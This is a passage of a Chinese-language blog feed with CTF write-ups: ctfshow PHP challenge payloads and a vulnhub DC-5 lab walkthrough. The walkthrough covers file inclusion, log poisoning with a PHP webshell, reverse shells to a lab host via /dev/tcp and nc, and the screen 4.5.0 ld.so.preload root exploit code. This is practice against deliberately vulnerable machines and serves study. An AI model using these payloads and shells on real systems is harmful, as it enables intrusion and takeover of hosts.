class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>?ctfshow=-1</code></p><h1 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$k</span> = <span class="variable">$_GET</span>[k];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;getflag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大小写绕过</p><p>payload:<code>?k=Getflag</code></p><h1 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="variable">$_GET</span>[f]);</span><br></pre></td></tr></table></figure><p>需要调用类中的函数：</p><p>payload:<code>?f=ctf::flag</code></p><h1 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">17</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:<code>code=echo cat *;</code></p><h1 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:<code>code=nl ../*</code></p><p>草，一直以为在<code>/tmp</code>下面的是flag，然后又限制8个字符读不到</p><h1 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:<code>code=nl *</code></p><p>(本来还以为是是什么极限绕过，没想到ls一看，啪，flag就在目录下)</p><h1 id="we422"><a href="#we422" class="headerlink" title="we422"></a>we422</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法1：payload:<code>code=nl *</code></p><p>跟上题一样</p><p>方法2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;cat <span class="comment">//创建一个文件夹cat</span></span><br><span class="line">* <span class="comment">//执行，会把文件夹的名字当作命令执行</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC-5</title>
      <link href="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/"/>
      <url>/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub-DC-5"><a href="#vulnhub-DC-5" class="headerlink" title="vulnhub-DC-5"></a>vulnhub-DC-5</h1><p>DC-5靶场下载地址：<a href="https://www.five86.com/downloads/DC-5.zip">https://www.five86.com/downloads/DC-5.zip</a></p><p>只需要下载，然后用VM打开，把网络配置改成net即可</p><h1 id="第一步：发现主机"><a href="#第一步：发现主机" class="headerlink" title="第一步：发现主机"></a>第一步：发现主机</h1><h2 id="方式一：使用nmap进行网段扫描和端口扫描"><a href="#方式一：使用nmap进行网段扫描和端口扫描" class="headerlink" title="方式一：使用nmap进行网段扫描和端口扫描"></a>方式一：使用nmap进行网段扫描和端口扫描</h2><p>网段扫描，主机是否在线：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sP <span class="number">192.168</span>.<span class="number">220.0</span>/<span class="number">24</span> -oN nmap220.sP</span><br><span class="line"></span><br><span class="line">-T4：表示设置扫描速度为 <span class="number">4</span>，这是一个中等的速度选项。你也可以根据实际情况调整扫描速度，例如使用 -T1（最慢）到 -T5（最快）之间的选项。</span><br><span class="line">-sP：表示进行 Ping 扫描，即对指定 IP 地址范围内的主机进行 ICMP Ping 检测，以确定主机是否在线。</span><br><span class="line">-oN nmap220.sP：表示输出扫描结果到文件 nmap220.sP 中，格式为普通文本。</span><br></pre></td></tr></table></figure><p>端口扫描，发现运行的服务：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 <span class="number">192.168</span>.<span class="number">153.143</span> -p- -oN <span class="number">143</span>.A</span><br><span class="line"></span><br><span class="line">-A：表示使用其它高级选项进行主机探测，包括操作系统检测、版本检测、脚本扫描等。-A 选项可以提供更详细的信息。</span><br><span class="line">-p- 表示全端口扫描</span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h2 id="方式二：使用fscan"><a href="#方式二：使用fscan" class="headerlink" title="方式二：使用fscan"></a>方式二：使用fscan</h2><p>（没有扫全端口）</p><p><img src="/Untitled-1.png" class="lazyload placeholder" data-srcset="/Untitled-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>综合考虑，经过排除，可以看到<code>192.168.153.143</code>就是我们的靶机了（我同时开了个centos）</p><p>一共开放了三个端口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">34574</span></span><br><span class="line"><span class="number">111</span></span><br></pre></td></tr></table></figure><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>访问一下80端口</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-2.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>这里有一些输入框,随便输一些东西进去试试</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-3.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>提交后到达这个页面</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-4.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>然后接下来就是一个神奇的思路了（不看wp我真想不出来</p><p>通过刷新此页面，可以看到下面<code>Copyright © 2018</code>一直在变，这里可以知道是文件包含（我也不知道为什么）</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-5.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-6.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-7.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>知道有文件包含之后，就得fuzz出参数了（这里就不fuzz，直接就是手动<code>file</code>了，用<code>arjun</code>也不太方便，因为页面内容一直变化，影响判断）</p><p>包含一下<code>passwd</code></p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-8.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>读<code>shadow</code>发现读不到，判断是权限不够，不是root账号</p><p>然后接下来就是读dc用户的<code>ssh</code>，<code>history</code>，发现都没有</p><p>等等！这byd是个文件包含，不是任意文件读取，能做得事情更多</p><p>我们先读取<code>nginx</code>配置文件：<code>/etc/nginx/nginx.conf</code></p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-9.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>小技巧，选择并右键查看源代码，这样更有可阅性，不会乱成一团</p><p>然后查找nginx日志位置</p><p>看到了</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-10.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-10.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>尝试在UA头发送一句话木马并包含</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-11.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-11.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>发送命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.153.143/thankyou.php?file=../../../../../../../../var/log/nginx/access.log&amp;1=ls</span></span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-12.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-12.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>成功getshell</p><p>但到这里不知道为什么webshell工具都突然发dian了，连接不上，又因为这个日志文件太大了，所以我想重新上个马，直接<code>touch</code>创建不了，因为权限不够</p><p>所以了php来创建（请记住我写的这个sb代码，直接把日志文件给搞下线了（原因不明</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-13.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-13.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>当我以为靶机坏了的时候，我打开我的xhell准备关闭，但一看</p><p>OHHHHH！</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-14.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-14.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>刚才反弹shell还剩个命令行（很难受的一个命令行窗口，不能任意操作）</p><p>所以我准备利用这个命令行来创建一个新马，首先查看<code>id</code>，发现是<code>www-data</code>权限，在网站目录下创建文件夹失败</p><p>我们可以先查看一下哪些文件夹普通用户有权限写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l / <span class="comment">#看一下根目录</span></span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-15.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-15.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>发现这个tmp目录权限挺高的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;?php eval(system(\$_POST[b]));?&gt;&quot;</span> &gt; /tmp/<span class="number">6</span>.txt</span><br></pre></td></tr></table></figure><p>直接创建一个文件</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-16.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-16.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>这样就重新连上了（但是webshell依然没搞定）</p><p>然后又回到刚才那个难受的窗口，学到了个新技巧切换到shell外壳（可以接收交互式shell）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-17.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-17.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>补充一下那个难受的反弹shell，但没办法，因为发送请求时用<code>sh -i &gt;&amp; /dev/tcp/192.168.153.138/8888 0&gt;&amp;1</code>的话<code>&amp;</code>会被误以为请求参数的连接符</p><p>所以使用了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -c sh <span class="number">192.168</span>.<span class="number">153.138</span> <span class="number">8888</span></span><br><span class="line"><span class="number">138</span>虚拟机开启监听：nc -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>权限太低了，很多操作都被限制了，提升一下权限。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">将可以提权的命令输出到/tmp/<span class="number">1</span>.txt</span><br><span class="line">find / -perm -<span class="number">4000</span> -o -perm -<span class="number">2000</span> &gt;&gt; /tmp/<span class="number">1</span>.txt</span><br><span class="line">或</span><br><span class="line">find / -user root -perm -<span class="number">4000</span> -<span class="keyword">print</span> <span class="number">2</span>&gt;/dev/<span class="literal">null</span> </span><br><span class="line"></span><br><span class="line">find：表示执行 find 命令，用于在文件系统中搜索文件和目录。</span><br><span class="line">    /：表示要搜索的起始路径。在这种情况下，/ 表示从根目录开始搜索整个文件系统。</span><br><span class="line">    -user root：表示匹配所有者为 root 的文件。</span><br><span class="line">    -perm -<span class="number">4000</span>：表示匹配具有 setuid 权限（数字 <span class="number">4000</span>）的文件。加号 - 表示匹配精确的权限。</span><br><span class="line">    -<span class="keyword">print</span>：表示打印匹配到的文件路径。</span><br><span class="line"></span><br><span class="line">最后的 <span class="number">2</span>&gt;/dev/<span class="literal">null</span> 是将标准错误输出重定向到空设备，以防止错误消息显示在终端上。</span><br></pre></td></tr></table></figure><p>查看</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-18.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-18.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>发现screen-4.5.0</p><p>在kali上查找可用于screen 4.5.0的漏洞脚本文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen <span class="number">4.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-19.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-19.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>PS：<code>searchsploit</code> 是一款在exp仓库中搜索可用exp的工具</p><p>查看一下exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/<span class="number">41154</span>.sh</span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-20.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-20.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><ol><li>创建第一个文件，并复制一下代码块</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vi libhax.c</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>创建第二个文件，复制第二个代码块</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vi rootshell.c</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">main</span>(<span class="keyword">void</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">seteuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">setegid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">execvp</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>编译文件</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-21.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-21.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-22.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-22.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>接下来就是把exp发送到靶机</p><p>kali开启服务</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-23.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-23.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>切换到tmp目录并下载exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">www-data@dc-<span class="number">5</span>:/tmp$ wget <span class="number">192.168</span>.<span class="number">153.129</span>:<span class="number">9999</span>/libhax.so</span><br><span class="line">www-data@dc-<span class="number">5</span>:/tmp$ wget <span class="number">192.168</span>.<span class="number">153.129</span>:<span class="number">9999</span>/rootshell</span><br></pre></td></tr></table></figure><p>最后就是执行exp的最后一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">umask <span class="number">000</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="keyword">echo</span> -ne <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span></span><br><span class="line">screen –ls</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><ul><li><p>幻想时间：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@dc-<span class="number">5</span>:id</span><br><span class="line">root</span><br></pre></td></tr></table></figure></li><li><p>现实：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-<span class="number">5</span>:/tmp$ ./<span class="number">2</span>.sh</span><br><span class="line">./<span class="number">2</span>.sh</span><br><span class="line"><span class="string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">Please set a terminal type.</span></span><br><span class="line"><span class="string">/tmp/rootshell: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34&#x27;</span> not <span class="title function_ invoke__">found</span> (required by /tmp/rootshell)</span><br></pre></td></tr></table></figure><p>  6，没提权成功，没找到是什么问题，靠</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>愚人杯wp</title>
      <link href="/2023/06/27/yu-ren-bei-wp/"/>
      <url>/2023/06/27/yu-ren-bei-wp/</url>
      
